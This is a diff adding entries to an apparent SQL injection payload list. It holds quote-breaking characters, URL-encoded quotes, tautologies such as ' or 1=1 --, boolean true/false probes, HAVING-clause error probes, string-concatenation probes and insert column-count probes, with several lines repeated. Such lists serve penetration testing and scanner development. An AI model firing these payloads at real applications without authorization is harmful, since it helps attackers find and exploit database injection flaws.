@@ -1,11 +1,71 @@
 '
+';
+)
+\'
+;
+\"
 "
+"'
+&#34
+&#39
+"' or 1=1 --
+"' or 1=1 /*
 %27
+%22
+%27%20—%20OR%201%3D1— 
+%27+—+OR+1%3D1— 
 " / %22
 ; / %3B
 %%2727
 %25%27
-`+HERP
+"' or 1=1 --
+"' or 1=1 /*
+'+HERP
 '||'DERP
 '+'herp
 ' ' DERP
+value' OR
+value' OR 5=5 OR 's'='0 
+value' AND 5=5 OR 's'='0 
+value' OR 5=0 OR 's'='0 
+value' AND 5=0 OR 's'='0 
+0+value
+value AND 5=5
+value AND 5=0
+value OR 5=5 OR 4=0 
+value OR 5=0 OR 4=0
+
+WF'SQL"Probe;A--B 
+' having 1=1--
+1 having 1=1--
+\' having 1=1--
+) having 1=1-- 
+%a5' having 1=1-- 
+|vol
+'|'vol
+"|"vol
+||vol
+'+"+'
+'+''+'
+'+'somechars 
+somechars'+'
+somechars'||'
+'||'somechars 
+'||'
+or 7659=7659
+and 7659=7659
+and 0=7659
+/**/or/**/ 7659=7659
+/**/and/**/ 7659=7659
+/**/and/** /0=7659
+' and 'barfoo'= 'foobar' --
+' or 'foobar'= 'foobar
+' and 'foobar'= 'foobar' --
+' and 'barfoo'= 'foobar' --
+' or 'foobar'= 'foobar
+' and 'foobar'= 'foobar' --
+# **for insert**
+foo’)--
+foo’, 1)--
+foo’, 1, 1)--
+foo’, 1, 1, 1)--
